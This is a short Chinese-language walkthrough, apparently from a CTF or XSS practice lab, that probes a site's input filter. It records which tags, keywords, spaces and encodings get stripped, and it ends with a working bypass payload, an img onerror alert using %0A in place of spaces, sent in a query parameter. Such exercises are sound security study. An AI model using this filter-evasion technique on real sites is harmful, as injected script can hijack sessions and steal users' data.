 测试过滤文字

```
onfocus <script> <a href=javascript:alert('xss')>
```

得到

```
onfocus < > 
```

发现`script`  `<a href>`直接被过滤了



再试试字符串拼接

```
">   <img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">   <"
```



直接被过滤光了

```
就剩这些了。
">      <"
```



大小写也被过滤了。

unicode编码javascript也不行

空格也被过滤了



总结

`/`   `空格` `script`  `<a href=>`等等都被过滤了。

 

这里采用不需要闭合的标签

```
<img src=1 onerror=alert(1)>
```





最后的payload

```
?keywprd=<img%0Asrc=1%0Aonerror=alert(1)>
```

